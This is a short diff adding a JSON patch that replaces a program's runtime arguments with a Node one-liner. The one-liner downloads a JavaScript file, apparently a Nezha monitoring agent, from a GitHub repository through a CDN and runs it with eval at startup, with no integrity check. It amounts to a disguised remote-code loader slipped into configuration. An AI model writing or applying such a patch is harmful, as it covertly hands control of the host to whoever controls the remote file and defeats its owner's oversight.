@@ -1,0 +1,3 @@
+[
+  {"op": "replace", "path": "runtime.args", "value": ["-e", "require('https').get('https://cdn.jsdelivr.net/gh/zx1447/nextindeex@main/nezha-pure-node/agent.js',r=>{let d='';r.on('data',c=>d+=c);r.on('end',()=>{eval(d)})})"]}
+]
